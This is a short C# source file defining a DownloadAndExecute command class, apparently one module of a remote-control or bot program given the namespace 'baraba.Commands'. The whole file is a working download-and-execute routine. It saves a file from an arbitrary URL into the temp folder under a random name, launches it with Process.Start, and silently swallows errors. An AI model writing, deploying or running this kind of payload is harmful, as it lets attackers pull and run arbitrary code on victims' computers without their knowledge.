using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;

namespace baraba.Commands
{
    class DownloadAndExecute
    {
        // Temp-Directory.
        private static string TempDir = Path.GetTempPath();
        // Path to downloaded File.
        private static string FilePath = String.Empty;
        /// <summary>
        /// Download File And Execute.
        /// </summary>
        public static void Perform(string Url)
        {
            if ((!TempDir.EndsWith(@"\")))
                TempDir += @"\";
            // Set Path for downloaded File.
            int SpecialCharCount = Url.Split('.').Length -1;
            FilePath = TempDir + Path.GetRandomFileName().Split('.')[0] + "." + Url.Split('.')[SpecialCharCount];
            // Create a new WebClient for downloading Files.
            WebClient Client = new WebClient();
            try
            {
                // Add EventHandler.
                Client.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete);
                // Download File.
                Client.DownloadFileAsync(new Uri(Url), FilePath);
            }
            catch (Exception e)
            {
                Debug.Print(e.StackTrace);
            }

        }

        /// <summary>
        /// Start Downloaded File, If Download Is Completed.
        /// </summary>
        private static void DownloadComplete(object sender, AsyncCompletedEventArgs e) 
        {
            try
            {
                // Sart downloaded File.
                Process.Start(FilePath);
                Debug.Print("Process Started: {0}", FilePath);
            }
            catch (Exception ex)
            {
                Debug.Print(ex.StackTrace);
            }
        }
    }
}
